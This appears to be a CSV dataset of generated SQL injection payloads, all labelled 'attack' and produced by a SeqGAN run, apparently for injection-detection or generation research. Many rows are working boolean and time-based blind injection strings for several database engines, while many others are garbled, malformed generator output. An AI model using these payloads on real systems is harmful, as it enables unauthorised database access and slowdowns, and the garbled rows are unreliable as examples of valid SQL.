label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )    )      )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1028
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""i"" like ""v",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1029
attack,1%'  rqrs where db$database  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1030
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1031
attack,"-5904"" and 3707  =    (  select count  (  rdb$cndbmssatie_ses ger  (  *  )   from as rde(500000000leive_mes as t3  (  chr  (  her  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1032
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1033
attack,1'   )    )    and 3202  =  like  (  'ables age  a  (  chr  (  ri us as col_uses rs as t  (  9687  (  *  %  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1034
attack,"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '""  =  ""hrdasg' like 'tg109g' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'b$fpipp_pe  (  *   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1035
attack,"select *  )   where 5019  =  'qqpjq'||1  )  --,dblesqs t4 and al_users all_userive.rer  (  3020  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1036
attack,"1'||  (  select 'eserxpr  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1037
attack,"1%' )    )   and 8189  =    s   (  ""   )   (  3020  =  like  (  8459  =  c  charales dbers as t3  )  5127,50000004906   )   from rdb$database  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1038
attack,"1%' fromysspibls 9660  ,(  condbpeserdabcde_m.raldom.sypes as t  (  cralgus ususustsuskippe.reconsupp and re_usserdbmssage  (  chr  (  69  )  ,5  )     (  select count  (  *  )   or k  )   from 6414  =    (  select ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1039
attack,1'   )    )      --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1040
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1041
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kibpps cndombles as gen  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1042
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1043
attack,1%',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1044
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsa'  =  'veveppe  (  select like  (  7182  =  1 or 8407  =    (  select counust  (upe  (  select and   (  101  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1045
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'ballrsibm.s as t2,el and    (     (  select cone  (  hr  (  117  )   from rdb$fib  (  ""vfvh""  (  'abcdefg',usprsibm.s as t3  )   and    (   ""ftrdbmblds_pasib  (  500000000/2  )   from rdb$fies and    (  cbssgibctain.s t  (  hcrale_l_e_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1046
attack,select case  (  rarapt_es all_useceipe_messas ables gen from anll_us as genex  (  *  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1047
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1048
attack,"1  )   and    (     (  select cn 8641  )   and   (  =  --dbm.rs as toomaibles t2,all_us as rs domains as t3  )   ardb$typessagexmesage  ,null  )  ,null  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1049
attack,1  )   where 2332  =  8459  )   and    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1050
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""fkepperepex  (  *4906  ||co  (  select   (  'abcdefg',u_ses  (  randus omas t3,all_useries systable.s arirables abds abeas 8407  =  5127  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1051
attack,"1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'p"" like ""   where 7185  )103--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1052
attack,1%'r,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1053
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1054
attack,"1""   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1055
attack,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""s  rpe_pptcera  (  chr  (  ,5  (  109from r  (  =91694906from 8407  =    (  select count  (  *  *  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1056
attack,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""pkzs",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1057
attack,"1  9607  =    )  ,d  ||d  ||chr  (  67  )  -- 2367  =  5098%ieceive_ses  (  char  (  select   =  like  (  r(  69  )   from rdb$fblombs el_uset  (  9354  =  1 or 8421  =    (  select count  (  *  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1058
attack,"2925  *  )   or * or 1022  =    (  1  )  ,5000000   where 2839  =  m)    (  select councteeaas t2,sys_pip   )sibm.sysibs_pipips  (sibsers gain",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1059
attack,-3953  )   as g5000000   )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1060
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1061
attack,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xm.andpperies_msers t3,ables as ele_serl_userssus t2,all_users where d  (  'qzvzq'(     2494  (  select   =  1 or 1  =  8459",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1062
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'v5098",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1063
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1064
attack,"1""  )   1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1065
attack,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1066
attack,"1""  )   or    )      )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1067
attack,"1' and 3202  =  like  (  'ables as ge      (  chr  (  char  (  select r  (  '  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'nt  (  110,46,5000000   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1068
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvman' like 'ipanjagkfbhllag',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1069
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1070
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%1'   )    )    )    asdbperstablees m.s asg""  =  ""givusers  colusummas g',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1071
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hxjglnandom.tas as coluns as t2,sysibsibm.syppess as t1,ssibm.sysibs  st_users t3sysibm.systabl_uses ns t3  (  *  )   or 8156  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1072
attack,"1%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1073
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1074
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1075
attack,"-1422%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '""jbstsysysgbnstbllonbs ablers cdblds as rdb$taies as gent  (  select counns gun ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1076
attack,"1"" and 'qjle'  =  9687 or 8407  =    (  select cont  (  he  (  select  (  'abcdefg',  (  3702  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1077
attack,"1'   )    )   )     )   from rdb$fisiell_users all_uses  (  8220  =  8459criesers sssage  (  char  (  ""ymss""  =  7471 where 4297  =  ' count  (  cer  (  r 7471  =  4212 or    (    as iolooses t3  )   from rs t3sagex  ,5127  ,0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1078
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1079
attack,"1""  ||chppcr  (  110,0(  116  )  (  1,5000000   )   or ""jkfk""  =  ' where 4297  =  7272 or 1  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1080
attack,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxpzn' like 'psqs'  =  'kabpee.r_messagex(  116  )   from 3202  =  1 and 6537  =  ,3056  (  ||chr  (  101  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1081
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1082
attack,"1'   )    )    as sgblds as rdomol_usumas t3,ass t5  )  )   or 7427  =  3902 or 7417  =    (  1,andbmssasibm.sysibm.s'  =  'atge_mas as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1083
attack,"select or 'qjle'  =  dbms_pesibceixe.s  s sysibmsas rll_users as gunand rdb$typecsers t3  )  ||char  ,5  )   or end from rdb$coususustabl_sers t4,ables ege_ser(  cpexpn  (  )   fromerables domaizesas ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1084
attack,"1'  )   where 3767  =  3767 and 6240  =    (  'jvpz where 8060  =  dbmsage  ,all_users t5  )   or rdb$database  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1085
attack,select colt  (  8459  (  select *  =  2332 or 0  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1086
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1087
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""miienjionsagypb  ssag",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1088
attack,"1jkkg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'z",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1089
attack,1%'  )   and 3202  =  like  (  'abs as t3  (  randestables age  (  'abcdefg'j,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1090
attack,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ppr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1091
attack,"1""  )   and    )      )   or 5556  =    (  select count  (  *  s  )   from rdb$ftins as domaine.colatas gtaus con.ras ungos where u  =  like  (  *  )   from 2367  =  6975 or magivecri",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1092
attack,"select *  )   and   asipipe.rere_sers iob  (  1,5000000   (  ch  (  *  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1093
attack,"select r rdb$comumn.sats all_users sysibm.systsysibm.syssws t2,all_useriessas rs dom' like 'iol_ussers t2,syssibm.stabl 5556osers ks t2,sysib  (  %   agix   sysibm.syns as t2,as els",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1094
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1095
attack,1'  )   ab  (  ries rdb$cons as t3  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1096
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1097
attack,"1""  )   where r $1(  5098  =  1 or ""%""  =  9169,120,domain.randbms_ns as gunt  (  chper   or  (  )   and   (    (8459      )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1098
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1099
attack,"1jgktnz'  =  'nq'%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1100
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '""cj'  =  'zzatp_vkkib"" like ""ypp_nsibm.sysibms_sumblsusisum.s  (  ralet_s(  ll_uses  (  *  )   or 2633  =  ,dbers as t1,domaiolu.t  (  d   from bldblerdb$vat  (  char  (  r 1  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1101
attack,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""safkkepexppre_qes crdb$collus as ts as t1,domas asidbms_pes 6414  (  *  )   astables erall_users ssibm.as as rs t3  )   and     (  mef(  *  )   from 3455  (  68  )  --)   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1102
attack,"1' e  )  ,db$$coltats as where db$tysusustabs rstables epececre_mess""  =  ""s dondomas as t2,rables rs as typessagexs ardbles ars domains as where uhr  (  'abcdefg',uper  (  *  rab tobesers ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1103
attack,"1'  )   abmes as rs t1,5  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1104
attack,"select 1 or or 7417  hr  (  select count  (  *  )   and   (  select count  (  *  rs4906(  o  (  1,5000000   )   from bles_us_users ms t5  (  select count  (  3020  =  1 or or   (  ""%""  =  1 or 1 'fg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1105
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  ""s""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1106
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1107
attack,"1%"" and   rdb$ceaateassssibm.s as t1,sysibm.systablessall_users ggkendbm.sysibm.s aget  (  *  )   asyp.re,ans gyppstrsysibm.sysibm.sibmestables as s t3  (  *  r and   (  'qomf' 8060  =  1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1108
attack,"select 2839  )   and    (    and   (  'abcdefg',5000000   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1109
attack,"select 9687 chr  (  8459  =  ',llds as ube_sers gun",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1110
attack,"1  )   asg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1111
attack,"1%5000000   )    )     )   where r  (  3175  (  select 2839  )   from rdb$typess as t3  (  110,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1112
attack,"1  )   from rdb$fkfgk_tdbles s as t3  (  *  )   from rdb$fies astasibs as t1,domains as t1,d5  )   or 0 5556  =  5098",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1113
attack,"1""  )   asgi'  =  'ins_zkip_pps_sgstg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1114
attack,"1'   )    )    as genvecrdssag',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ippippe_sers sysibm.systains as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1115
attack,"1'  )   where 3767  =  3767 and 6240  =    (  'qq"" like ""qq"" like ""tab' like 'pn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1116
attack,"1  =  ' where 9687  =  8933 and    (  select count  (  *  )   andblds as toomas as as tob  asyssib$tasysibm.sysibm.systide_mostabl_users s t3,alle_uses  (  (  randomons as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1117
attack,"select when ""jkfk""  =  m=    and   (  select count  (  *  (  8220  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1118
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ''h",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1119
attack,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1120
attack,"dabldbsegerex  ,sypp_sers all_users sysibmssibsss(si    (     (   'bhlx' uomains as gumm.t  (  *  )  --d",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1121
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1122
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1123
attack,"1""  =    (   if    (       (  select count  (  hr  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1124
attack,"1%'  )   or 8384  =  like  (  'abcdecalatesageiv   (  'teng' counustombles ellum.rans gaunds as t2,s as t2,s usatos as t3  )  8148--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1125
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1126
attack,"select case 5903  =  8100 andstabl_users as t2,rl_users t1,sysibm.sastables as uss s t43  )   from 'qjle'  =  7007 or  5903  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1127
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1128
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1129
